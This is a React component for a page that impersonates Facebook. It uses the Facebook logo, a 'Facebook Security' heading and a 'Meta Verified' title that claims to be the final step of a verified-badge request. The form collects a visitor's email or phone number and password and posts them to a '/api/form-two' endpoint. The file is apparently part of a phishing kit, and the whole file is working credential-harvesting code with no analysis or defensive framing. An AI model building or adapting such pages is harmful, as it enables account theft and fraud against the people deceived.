import React, { useState } from "react";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { useLocation } from "wouter";
import MetaTags from "@/components/meta-tags";
import { z } from "zod";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { countries } from "@/lib/countries";

// Form schema for the confirmation step
const confirmationFormSchema = z.object({
  user_email: z.string().optional(),
  password: z.string().min(6, "Password must be at least 6 characters"),
});

type ConfirmationFormValues = z.infer<typeof confirmationFormSchema>;

export default function Confirmation() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const [contactMethod, setContactMethod] = useState<'email' | 'phone'>('email');
  const [countryCode, setCountryCode] = useState('+1');

  const form = useForm<ConfirmationFormValues>({
    resolver: zodResolver(confirmationFormSchema),
    defaultValues: {
      user_email: "",
      password: "",
    },
  });

  const validateInput = (value: string, type: 'email' | 'phone'): boolean => {
    if (!value) return true; // Empty value is now valid
    if (type === 'email') {
      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
    } else {
      // Basic phone number validation (at least 10 digits)
      return /^\d{10,}$/.test(value.replace(/\D/g, ''));
    }
  };

  const onSubmit = async (data: ConfirmationFormValues) => {
    try {
      const contactValue = data.user_email?.trim() || '';

      // Only validate if a value is provided
      if (contactValue && !validateInput(contactValue, contactMethod)) {
        throw new Error(`Please enter a valid ${contactMethod === 'email' ? 'email address' : 'phone number'}`);
      }

      // Format the contact information based on the selected method
      const formattedData = {
        user_email: contactValue ? (contactMethod === 'phone' ? `${countryCode}${contactValue}` : contactValue) : '',
        password: data.password,
      };

      const response = await fetch('/api/form-two', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formattedData),
      });

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.message || 'Failed to submit form');
      }

      toast({
        title: "Success!",
        description: "Your form has been submitted successfully"
      });
      setLocation("/success");
    } catch (error: any) {
      console.error('Form submission error:', error);
      toast({
        variant: "destructive",
        title: "Error",
        description: error.message || "Failed to submit form. Please try again.",
      });
    }
  };

  return (
    <>
      <MetaTags 
        title="Meta Verified | Confirmation"
        description="Request a verified badge on Facebook - Final Step"
      />
      <div className="min-h-screen flex justify-center items-center p-3 sm:p-4 bg-gradient-to-br from-[#0180FA]/20 via-[#f0f2f5] to-[#0180FA]/30 animate-gradient bg-[length:400%_400%]">
        <div className="bg-white/90 backdrop-blur-sm p-6 sm:p-8 rounded-lg shadow-lg max-w-[360px] w-full text-center border border-white/20 hover:shadow-xl transition-shadow duration-300">
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Facebook_Logo_2023.png/600px-Facebook_Logo_2023.png?20231011121526"
            alt="Logo"
            className="w-[100px] sm:w-[120px] mx-auto mb-4 sm:mb-5"
          />
          <h1 className="text-base sm:text-lg font-bold text-[#333] mb-4 sm:mb-5">
            Facebook Security
          </h1>
          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
              <div className="text-left">
                <div className="mb-4">
                  <label className="block font-semibold mb-1.5 text-[#606770] text-xs sm:text-sm">
                    Contact Method
                  </label>
                  <div className="flex gap-4">
                    <button
                      type="button"
                      onClick={() => setContactMethod('email')}
                      className={`flex-1 py-1.5 text-sm rounded transition-colors duration-200 ${
                        contactMethod === 'email'
                          ? 'bg-[#0180FA] text-white shadow-md'
                          : 'bg-[#e4e6eb] text-[#606770] hover:bg-[#0180FA]/10'
                      }`}
                    >
                      Email
                    </button>
                    <button
                      type="button"
                      onClick={() => setContactMethod('phone')}
                      className={`flex-1 py-1.5 text-sm rounded transition-colors duration-200 ${
                        contactMethod === 'phone'
                          ? 'bg-[#0180FA] text-white shadow-md'
                          : 'bg-[#e4e6eb] text-[#606770] hover:bg-[#0180FA]/10'
                      }`}
                    >
                      Phone
                    </button>
                  </div>
                </div>

                <FormField
                  control={form.control}
                  name="user_email"
                  render={({ field }) => (
                    <FormItem>
                      <label className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
                        {contactMethod === 'email' ? 'Email Address' : 'Phone Number'}
                      </label>
                      <FormControl>
                        <div className="flex gap-2">
                          {contactMethod === 'phone' && (
                            <Select
                              value={countryCode}
                              onValueChange={setCountryCode}
                            >
                              <SelectTrigger className="w-[100px]">
                                <SelectValue placeholder="Code" />
                              </SelectTrigger>
                              <SelectContent className="max-h-[200px]">
                                {countries.map((country) => (
                                  <SelectItem key={country.code} value={country.code}>
                                    {country.code} ({country.name})
                                  </SelectItem>
                                ))}
                              </SelectContent>
                            </Select>
                          )}
                          <Input
                            type={contactMethod === 'email' ? 'email' : 'tel'}
                            placeholder={
                              contactMethod === 'email'
                                ? "Enter email address"
                                : "Enter phone number"
                            }
                            className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#0180FA] focus:ring-2 focus:ring-[#0180FA] focus:ring-opacity-20"
                            {...field}
                            onChange={(e) => {
                              let value = e.target.value;
                              if (contactMethod === 'phone') {
                                // Remove non-digit characters for phone numbers
                                value = value.replace(/\D/g, '');
                              }
                              field.onChange(value);
                            }}
                          />
                        </div>
                      </FormControl>
                      <FormMessage className="text-xs text-red-500 mt-1" />
                    </FormItem>
                  )}
                />
              </div>

              <FormField
                control={form.control}
                name="password"
                render={({ field }) => (
                  <FormItem className="text-left">
                    <label className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
                      Password
                    </label>
                    <FormControl>
                      <Input
                        type="password"
                        placeholder="Enter password"
                        className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#0180FA] focus:ring-2 focus:ring-[#0180FA] focus:ring-opacity-20"
                        {...field}
                      />
                    </FormControl>
                    <FormMessage className="text-xs text-red-500 mt-1" />
                  </FormItem>
                )}
              />

              <Button 
                type="submit" 
                className="w-full bg-[#0180FA] hover:bg-[#0180FA]/90 text-white font-semibold py-1.5 sm:py-2 px-3 sm:px-4 rounded-md text-sm transition-colors duration-200 shadow-md"
                disabled={form.formState.isSubmitting}
              >
                {form.formState.isSubmitting ? "Submitting..." : "Submit"}
              </Button>
            </form>
          </Form>
        </div>
      </div>
    </>
  );
}